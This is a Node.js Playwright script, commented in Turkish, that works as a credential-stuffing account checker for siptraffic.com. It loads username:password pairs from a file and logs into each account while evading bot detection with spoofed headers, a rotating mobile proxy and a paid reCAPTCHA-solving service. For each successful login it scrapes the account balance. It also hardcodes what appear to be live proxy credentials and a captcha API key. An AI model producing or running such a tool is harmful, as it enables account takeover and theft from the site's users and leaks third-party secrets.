import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { chromium } from 'playwright';
import { prepareRecaptcha, getSolverRecaptchaToken, injectRecaptchaToken } from './captcha.js';
const __dirname = path.dirname(fileURLToPath(import.meta.url));
process.chdir(__dirname);

const BASE_URL = 'https://www.siptraffic.com';
const LOGIN_URL = `${BASE_URL}/login`;
const DASHBOARD_URL = `${BASE_URL}/dashboard`;

const PROXY_URL =
    process.env.PROXY_URL || 'http://buymobileproxycom:kirsehir6367@ankara8.buymobileproxy.com:8029';
const NO_PROXY = process.env.NO_PROXY === '1';
const HEADLESS = process.env.HEADLESS !== '0';
const CAPTCHA_API_KEY = process.env.CAPTCHA_API_KEY || '400eae8915824544df0ca7ac65564ee8';
const CAPTCHA_PROVIDER = (process.env.CAPTCHA_PROVIDER || 'capmonster').toLowerCase();
const CAPMONSTER_URL = process.env.CAPMONSTER_URL || 'https://api.capmonster.cloud';
const RECAPTCHA_TOKEN = process.env.RECAPTCHA_TOKEN || '';

const FAIL_TEST = process.argv.includes('--fail-test');
const DEFAULT_USER_AGENT =
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36';
const DRY_RUN = process.env.DRY_RUN === '1';
const LIMIT = process.env.LIMIT ? parseInt(process.env.LIMIT, 10) : 0;

function maskProxyUrl(url) {
    try {
        const parsed = new URL(url);
        if (parsed.password) parsed.password = '***';
        return `${parsed.protocol}//${parsed.username ? `${parsed.username}:***@` : ''}${parsed.host}`;
    } catch {
        return '[proxy]';
    }
}

function parseProxyConfig(url) {
    if (!url) return null;
    const parsed = new URL(url);
    return {
        server: `${parsed.protocol}//${parsed.host}`,
        username: parsed.username || undefined,
        password: parsed.password || undefined,
    };
}

const proxyConfig = !NO_PROXY ? parseProxyConfig(PROXY_URL) : null;

async function testProxyConnectivity() {
    if (!proxyConfig) return true;
    try {
        const { ProxyAgent, fetch: ufetch } = await import('undici');
        const agent = new ProxyAgent(PROXY_URL);
        const res = await ufetch('https://www.siptraffic.com/login', {
            dispatcher: agent,
            signal: AbortSignal.timeout(15000),
        });
        return res.status < 500;
    } catch (err) {
        console.error(`❌ Proxy bağlantı testi başarısız: ${err.message}`);
        return false;
    }
}

console.log('▶ SipTraffic Login Checker (Playwright)');
console.log('📁 Çalışma dizini:', __dirname);
if (proxyConfig) console.log(`🌐 Proxy aktif: ${maskProxyUrl(PROXY_URL)}`);
if (NO_PROXY) console.log('🌐 Proxy kapalı (NO_PROXY=1)');
if (HEADLESS) console.log('🖥️ Headless mod');
if (CAPTCHA_API_KEY) console.log(`🤖 Captcha solver: ${CAPTCHA_PROVIDER}`);
else if (RECAPTCHA_TOKEN) console.log('🤖 Manuel reCAPTCHA token aktif');
else console.log('🤖 Captcha: once tarayici icinden, gerekirse CAPTCHA_API_KEY ile solver');if (DRY_RUN) console.log('🧪 DRY_RUN modu — tarayıcı açılmayacak');
if (FAIL_TEST) console.log('🔴 Başarısız giriş testi modu');
if (LIMIT > 0) console.log(`🔢 LIMIT: ${LIMIT} hesap`);

function saveToResultFile(message) {
    const timestamp = new Date().toLocaleString('tr-TR');
    fs.appendFileSync('result.txt', `[${timestamp}] ${message}\n`, 'utf8');
}

function readAccountsFromLogFile() {
    try {
        if (!fs.existsSync('log.txt')) {
            console.log('❌ log.txt bulunamadı!');
            return [];
        }

        const lines = fs
            .readFileSync('log.txt', 'utf8')
            .split(/\r?\n/)
            .map((l) => l.trim())
            .filter((l) => l.length > 0 && !l.startsWith('#'));

        return lines
            .map((line) => {
                const idx = line.indexOf(':');
                if (idx === -1) return null;
                return {
                    username: line.slice(0, idx).trim(),
                    password: line.slice(idx + 1).trim(),
                };
            })
            .filter((a) => a?.username && a?.password);
    } catch (err) {
        console.error('❌ log.txt okunamadı:', err.message);
        return [];
    }
}

function isDashboardUrl(url) {
    try {
        const u = new URL(url);
        return u.pathname === '/dashboard' || u.pathname.startsWith('/dashboard/');
    } catch {
        return false;
    }
}

function isLoginUrl(url) {
    try {
        const u = new URL(url);
        return u.pathname === '/login' || u.pathname.startsWith('/login/');
    } catch {
        return false;
    }
}

function isWarningUrl(url) {
    try {
        const u = new URL(url);
        return u.pathname.includes('warning');
    } catch {
        return false;
    }
}

async function waitForLoginForm(page, timeout = 60000) {
    for (let attempt = 1; attempt <= 3; attempt++) {
        try {
            await page.goto(LOGIN_URL, { waitUntil: 'domcontentloaded', timeout });

            for (let i = 0; i < 6; i++) {
                const count = await page.locator('input[name="login[username]"]:visible').count();
                if (count > 0) return true;
                await page.waitForTimeout(2000);
            }
        } catch (err) {
            const msg = err.message?.slice(0, 80) || 'unknown';
            if (attempt < 3) {
                console.log(`   ↺ Sayfa yükleme hatası (deneme ${attempt}/3): ${msg}`);
                await page.waitForTimeout(3000);
                continue;
            }
        }
        return false;
    }
    return false;
}

async function waitForFingerprintCookies(page, timeout = 25000) {
    // fp/fp2 httpOnly olduğu için document.cookie'de görünmez — context.cookies() kullan
    const context = page.context();
    const deadline = Date.now() + timeout;
    while (Date.now() < deadline) {
        const cookies = await context.cookies('https://www.siptraffic.com');
        if (cookies.some(c => c.name === 'fp' || c.name === 'fp2')) return true;
        await page.waitForTimeout(1500);
    }
    return false;
}

function isLoggedInUrl(url) {
    if (isDashboardUrl(url)) return true;
    try {
        const u = new URL(url);
        return (
            u.pathname.includes('buy_credit') ||
            u.pathname.includes('account') ||
            u.pathname.includes('settings')
        );
    } catch {
        return false;
    }
}

async function finalizeLoginCheck(page, username) {
    let currentUrl = page.url();
    console.log(`📄 Yönlendirme URL: ${currentUrl}`);

    // Başarılı giriş sonrası URL kontrolleri (buy_credit2, dashboard, account vb.)
    if (!isLoginUrl(currentUrl) && !isWarningUrl(currentUrl)) {
        console.log(`✅ Giriş başarılı — dashboard kontrol ediliyor...`);
        // dashboard'a git (bakiye çekmek için)
        await page.goto(DASHBOARD_URL, { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
        await page.waitForTimeout(3000);
        currentUrl = page.url();
        console.log(`📄 Dashboard URL: ${currentUrl}`);
    }

    if (isDashboardUrl(currentUrl)) {
        const loggedIn = await isActuallyLoggedIn(page);
        if (!loggedIn) {
            // Dashboard'da değil aslında — giriş gerçekten başarısız
            const failure = await detectLoginFailure(page);
            if (failure) {
                const msg = `GİRİŞ BAŞARISIZ - ${username} | ${failure}`;
                console.log(`❌ ${msg}`);
                saveToResultFile(msg);
                return { success: false, reason: failure };
            }
            const msg = `GİRİŞ BAŞARISIZ - ${username} | yanlış şifre veya engellendi`;
            console.log(`❌ ${msg}`);
            saveToResultFile(msg);
            return { success: false, reason: 'redirected to login' };
        }

        const balance = await extractBalance(page);
        if (balance) {
            console.log(`💰 Bakiye: ${balance}`);
        } else {
            console.log('💰 Bakiye: bulunamadı');
        }

        const balancePart = balance ? ` | Bakiye: ${balance}` : ' | Bakiye: bulunamadı';
        const msg = `GİRİŞ BAŞARILI - ${username}${balancePart}`;
        console.log(`✅ ${msg}`);
        saveToResultFile(msg);
        return { success: true, reason: 'logged in', balance };
    }

    // Hâlâ login sayfasındaysak
    if (isLoginUrl(currentUrl)) {
        const failure = await detectLoginFailure(page);
        if (failure) {
            const msg = `GİRİŞ BAŞARISIZ - ${username} | ${failure}`;
            console.log(`❌ ${msg}`);
            saveToResultFile(msg);
            return { success: false, reason: failure };
        }
        const msg = `GİRİŞ BAŞARISIZ - ${username} | yanlış şifre veya engellendi`;
        console.log(`❌ ${msg}`);
        saveToResultFile(msg);
        return { success: false, reason: 'login failed' };
    }

    if (isWarningUrl(currentUrl)) {
        const msg = `GİRİŞ BAŞARISIZ - ${username} | oturum süresi doldu / warning.html`;
        console.log(`❌ ${msg}`);
        saveToResultFile(msg);
        return { success: false, reason: 'warning page' };
    }

    const msg = `GİRİŞ BELİRSİZ - ${username} | ${currentUrl}`;
    console.log(`⚠️ ${msg}`);
    saveToResultFile(msg);
    return { success: null, reason: currentUrl };
}

async function isActuallyLoggedIn(page) {
    // Login formu yoksa giriş başarılı — keyword eşleşmesi güvenilmez
    const hasLoginForm = await page.locator('input[name="login[username]"]')
        .isVisible({ timeout: 500 }).catch(() => false);
    return !hasLoginForm;
}

async function extractBalance(page) {
    // Birkaç saniye bekle — AngularJS dashboard geç render edebilir
    await page.waitForTimeout(5000);

    const selectors = [
        '#component-user-balance_info > div > span.low-balance',
        '#component-user-balance_info span.low-balance',
        '#component-user-balance_info span',
        '[id*=balance] span',
        '.balance',
        '[class*=balance]',
    ];

    for (const selector of selectors) {
        const el = page.locator(selector).first();
        if (await el.isVisible({ timeout: 2000 }).catch(() => false)) {
            const text = (await el.innerText()).trim();
            if (text && /[\d,.]/.test(text)) return text;
        }
    }

    // Herhangi bir sayısal bakiye benzeri metin dene
    const balance = await page.evaluate(() => {
        const all = [...document.querySelectorAll('span, div, td')];
        for (const el of all) {
            const t = (el.innerText || '').trim();
            if (/^\$?\s*\d+[\d,]*\.\d{2}/.test(t) && t.length < 20) return t;
        }
        return null;
    });

    return balance;
}

async function detectLoginFailure(page) {
    const bodyText = (await page.innerText('body').catch(() => '')).toLowerCase();

    const hardFailPatterns = [
        'invalid username or password',
        'incorrect username or password',
        'wrong username or password',
        'login failed',
        'authentication failed',
    ];

    for (const pattern of hardFailPatterns) {
        if (bodyText.includes(pattern)) return pattern;
    }

    if (isWarningUrl(page.url())) {
        return 'session expired / warning page';
    }

    return null;
}

async function launchBrowser() {
    const launchOptions = {
        headless: HEADLESS,
        args: [
            '--disable-blink-features=AutomationControlled',
            '--no-first-run',
            '--no-default-browser-check',
        ],
    };

    if (proxyConfig) {
        launchOptions.proxy = proxyConfig;
    }

    try {
        return await chromium.launch({
            ...launchOptions,
            channel: 'chrome',
        });
    } catch {
        return chromium.launch(launchOptions);
    }
}

async function checkAccount(username, password, browser = null) {
    console.log(`\n────────────────────────────────────`);
    console.log(`🔍 Kullanıcı: ${username}`);

    if (DRY_RUN) {
        console.log('🧪 DRY_RUN — tarayıcı açılmayacak');
        return { success: null, reason: 'DRY_RUN' };
    }

    const ownsBrowser = !browser;
    let context;
    try {
        if (!browser) browser = await launchBrowser();

        context = await browser.newContext({
            locale: 'en-US',
            userAgent: DEFAULT_USER_AGENT,
            // HeadlessChrome'u gizle — gerçek Chrome başlıkları
            extraHTTPHeaders: {
                'sec-ch-ua': '"Google Chrome";v="150", "Chromium";v="150", "Not;A=Brand";v="8"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'accept-language': 'en-US,en;q=0.9',
            },
        });
        const page = await context.newPage();

        // 1) Önce sayfayı yükle — fp/fp2 cookie'lerin gelmesini bekle
        console.log('🌐 Login sayfası açılıyor...');
        const formReady = await waitForLoginForm(page);
        if (!formReady) {
            if (isWarningUrl(page.url())) {
                const msg = `GİRİŞ BAŞARISIZ - ${username} | warning.html (oturum/fingerprint)`;
                console.log(`❌ ${msg}`);
                saveToResultFile(msg);
                return { success: false, reason: 'warning page before login' };
            }
            const msg = `BAĞLANTI HATASI - ${username} | login formu yüklenmedi (${page.url()})`;
            console.log(`❌ ${msg}`);
            saveToResultFile(msg);
            return { success: false, reason: 'login form missing' };
        }

        const fpReady = await waitForFingerprintCookies(page, 30000);
        console.log(fpReady ? '🍪 Fingerprint cookie hazır' : '⚠️ fp/fp2 gelmedi, devam ediliyor');
        await page.waitForTimeout(1000);

        // 2) Önce reCAPTCHA token al, sonra form doldur ve submit et
        //    (Token alımı uzun sürdüğünde form/oturum resetlenmesin diye önce alıyoruz)
        if (RECAPTCHA_TOKEN) {
            await injectRecaptchaToken(page, RECAPTCHA_TOKEN);
            console.log('✅ Manuel reCAPTCHA token enjekte edildi');
        } else if (CAPTCHA_API_KEY) {
            try {
                console.log('🤖 reCAPTCHA token alınıyor...');
                const solved = await getSolverRecaptchaToken(
                    LOGIN_URL, CAPTCHA_PROVIDER, CAPTCHA_API_KEY, CAPMONSTER_URL
                );
                await injectRecaptchaToken(page, solved.token);
                console.log(`✅ Token hazır (action=${solved.action})`);
            } catch (err) {
                console.log(`⚠️ reCAPTCHA alınamadı: ${err.message}`);
                await prepareRecaptcha(page, { pageUrl: LOGIN_URL }).catch(() => {});
            }
        } else {
            await prepareRecaptcha(page, { pageUrl: LOGIN_URL }).catch(() => {});
        }

        // 3) Formu doldur ve submit et
        const userInput = page.locator('input[name="login[username]"]:visible').first();
        const passInput = page.locator('input[name="login[password]"]:visible').first();
        const form = page.locator('form.login-form-clx').filter({ has: userInput }).first();

        await userInput.fill(username);
        await passInput.fill(password);
        await page.waitForTimeout(300);

        console.log('🔐 Giriş deneniyor...');
        await form.locator('input[type="submit"].button').click();

        // Redirect'i bekle (buy_credit, dashboard, vb.)
        await page.waitForURL(
            (url) => !url.toString().includes('/login'),
            { timeout: 30000 }
        ).catch(() => {});
        await page.waitForTimeout(2000);

        return await finalizeLoginCheck(page, username);
    } catch (err) {
        const msg = `SİSTEM HATASI - ${username} | ${err.message}`;
        console.log(`❌ ${msg}`);
        saveToResultFile(msg);
        return { success: false, reason: err.message };
    } finally {
        if (context) await context.close().catch(() => {});
        if (ownsBrowser && browser) await browser.close();
    }
}

async function runFailTest() {
    console.log('\n🧪 Başarısız giriş testi başlatılıyor...');
    const fakeUser = `invalid_user_${Date.now()}`;
    const fakePass = 'wrong_password_12345';

    const result = await checkAccount(fakeUser, fakePass);

    if (result.success === false) {
        console.log('\n✅ Başarısız giriş testi OK — giriş reddedildi.');
        console.log(`   Sebep: ${result.reason}`);
        saveToResultFile(`FAIL TEST OK — giriş reddedildi (${fakeUser}) | ${result.reason}`);
        return;
    }

    console.log('\n⚠️ Başarısız giriş testi beklenen sonucu vermedi.');
    saveToResultFile(`FAIL TEST UYARI — beklenmeyen sonuç: ${result.reason}`);
}

async function runChecker() {
    if (FAIL_TEST) {
        await runFailTest();
        console.log('\n🏁 Bitti. result.txt dosyasını kontrol et.');
        return;
    }

    const allAccounts = readAccountsFromLogFile();
    if (allAccounts.length === 0) {
        console.log('🛑 log.txt boş veya geçersiz.');
        console.log('   Format (her satır): kullaniciadi:sifre');
        console.log('   Örnek: echo "user:pass" >> log.txt');
        return;
    }

    const accounts = LIMIT > 0 ? allAccounts.slice(0, LIMIT) : allAccounts;
    console.log(`📋 log.txt: ${allAccounts.length} hesap, ${accounts.length} tanesi kontrol edilecek`);

    if (DRY_RUN) {
        accounts.forEach((a, i) => console.log(`   ${i + 1}. ${a.username}`));
        return;
    }

    if (proxyConfig) {
        console.log('🔌 Proxy bağlantısı test ediliyor...');
        const proxyOk = await testProxyConnectivity();
        if (!proxyOk) {
            console.log('⚠️  Proxy çalışmıyor! NO_PROXY=1 ile direkt bağlantı dene veya proxy adresini kontrol et.');
            console.log('   Devam etmek için birkaç saniye bekleyip yeniden deneniyor...');
            await new Promise(r => setTimeout(r, 5000));
        } else {
            console.log('✅ Proxy bağlantısı OK');
        }
    }

    let browser;
    const stats = { ok: 0, fail: 0, unknown: 0 };

    try {
        browser = await launchBrowser();

        for (let i = 0; i < accounts.length; i++) {
            const account = accounts[i];
            console.log(`\n[${i + 1}/${accounts.length}]`);
            const result = await checkAccount(account.username, account.password, browser);

            if (result.success === true) stats.ok++;
            else if (result.success === false) stats.fail++;
            else stats.unknown++;

            if (i < accounts.length - 1) {
                await new Promise((r) => setTimeout(r, 2000));
            }
        }
    } finally {
        if (browser) await browser.close();
    }

    console.log('\n════════════════════════════════════');
    console.log(`📊 Özet: ${stats.ok} başarılı | ${stats.fail} başarısız | ${stats.unknown} belirsiz`);
    console.log('🏁 Bitti. Detaylar: result.txt');
}

runChecker().catch((err) => {
    console.error('💥 Kritik hata:', err);
    process.exit(1);
});
